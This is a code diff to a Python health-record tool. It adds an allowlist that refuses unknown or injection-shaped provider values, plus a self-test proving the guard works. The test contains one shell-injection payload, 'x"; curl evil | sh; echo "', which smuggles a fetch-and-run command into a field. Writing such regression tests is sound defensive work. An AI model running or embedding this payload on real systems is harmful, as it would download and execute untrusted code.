@@ -78,6 +78,14 @@ CLASS_SETUP = "setup"        # runner/tooling problem (NOT a provider-access sig
 CLASS_UNKNOWN = "unknown"    # unattributable failure: counts toward PERSISTENCE, never OUTAGE
 CLASS_ZERO_DISPATCH = "zero-dispatch"  # dispatch planned >0 but launched 0 (fleet-wide signal)
 
+# The ONLY providers a health record may carry (issue #199). `provider` is CATALOG-controlled
+# (an account issue's free-form `provider:` line, parsed verbatim), so a record command whose
+# --provider is anything but a known real provider (anthropic/openai) or the fleet pseudo-provider
+# (zero-dispatch's single fleet-wide signal) is a corrupt/hostile catalog value and is REFUSED —
+# never written to the ledger. This is the fail-closed backstop behind the workflow change that
+# stopped interpolating this string into `run:` shell source.
+VALID_RECORD_PROVIDERS = frozenset({"anthropic", "openai", "fleet"})
+
 # raw worker-live.sh exit-class -> decision class
 _EXIT_CLASS_MAP = {
     "session-limit": CLASS_LIMIT,
@@ -1192,6 +1200,13 @@ def _provider_of(body):
 # CLI
 # ---------------------------------------------------------------------------------------------
 def _cmd_record(args):
+    # Fail closed on a provider outside the known set (issue #199): the value is catalog-controlled
+    # and must never reach the ledger unvalidated. A separate always()-guarded job runs this, so a
+    # red exit is a VISIBLE integrity signal, not a run failure.
+    if args.provider not in VALID_RECORD_PROVIDERS:
+        print(f"::error::model-health record: refusing unknown provider "
+              f"{args.provider!r} (must be one of {sorted(VALID_RECORD_PROVIDERS)})")
+        return 1
     salt = os.environ.get("PROVENANCE_SALT", "")
     # provider=fleet + zero-dispatch carries NO account (there is no single account); everything
     # else salts the raw handle HERE so a raw handle never reaches the ledger.
@@ -1754,6 +1769,9 @@ def _self_test():
     # ---- record exits NONZERO on CAS exhaustion (defect #8) ----------------------------------
     ok = _test_record_exit(chk) and ok
 
+    # ---- #199: record REFUSES a catalog-controlled provider outside the known set ------------
+    ok = _test_record_provider_guard(chk) and ok
+
     # ---- decide exits NONZERO on an unreadable ledger (review r3) ----------------------------
     ok = _test_decide_exit(chk) and ok
 
@@ -2051,6 +2069,60 @@ def _test_record_exit(chk):
         args = _ap.Namespace(provider="anthropic", account="", model_alias="fable",
                              exit_class="auth", run_id="1", reset_hint=None)
         chk("record exits nonzero on CAS exhaustion", _cmd_record(args), 1)
+    finally:
+        GitHubAPI = real_api
+        for k, v in saved.items():
+            if v is None:
+                os.environ.pop(k, None)
+            else:
+                os.environ[k] = v
+    return True
+
+
+def _test_record_provider_guard(chk):
+    """#199: _cmd_record REFUSES a catalog-controlled provider outside VALID_RECORD_PROVIDERS and
+    writes NOTHING, while a known provider still records. Non-vacuous: the injection-shaped provider
+    must return 1 with the ledger writer NEVER touched (put_count stays 0), and the valid provider
+    must return 0 with exactly one write — so deleting the guard flips BOTH assertions red."""
+    import argparse as _ap
+    global GitHubAPI
+    real_api = GitHubAPI
+    saved = {k: os.environ.get(k) for k in
+             ("REGISTRY_REPO", "WORKER_ACCOUNT_HANDLE", "PROVENANCE_SALT",
+              "GH_TOKEN", "REGISTRY_ALERT_TOKEN")}
+
+    class _CountingAPI:
+        put_count = 0
+
+        def __init__(self, token):
+            pass
+
+        def request(self, method, path, body=None, allow_404=False, retry_conflict=False):
+            if method == "GET":
+                # branch exists (present ref) but the ledger FILE does not yet -> seed empty window
+                return {"object": {"sha": "b"}} if "git/ref/heads" in path else None
+            _CountingAPI.put_count += 1
+            return {"content": {"sha": "deadbeef"}}
+
+    def _rec(provider):
+        return _ap.Namespace(provider=provider, account="", model_alias="fable",
+                             exit_class="auth", run_id="1", reset_hint=None)
+
+    try:
+        os.environ.update(REGISTRY_REPO="o/r", WORKER_ACCOUNT_HANDLE="acct01",
+                          PROVENANCE_SALT="s3cret", GH_TOKEN="tok")
+        GitHubAPI = _CountingAPI
+        # A provider carrying shell metacharacters is exactly the exploit string from #199.
+        _CountingAPI.put_count = 0
+        chk("record refuses shell-injection provider",
+            _cmd_record(_rec('x"; curl evil | sh; echo "')), 1)
+        chk("refused provider writes NO record", _CountingAPI.put_count, 0)
+        # A plausible-but-unknown provider is refused too (not just the metacharacter case).
+        chk("record refuses unknown provider", _cmd_record(_rec("anthropi")), 1)
+        chk("unknown provider writes NO record", _CountingAPI.put_count, 0)
+        # A known provider is NOT blocked by the guard — it records exactly once.
+        chk("record accepts known provider", _cmd_record(_rec("anthropic")), 0)
+        chk("known provider writes one record", _CountingAPI.put_count, 1)
     finally:
         GitHubAPI = real_api
         for k, v in saved.items():
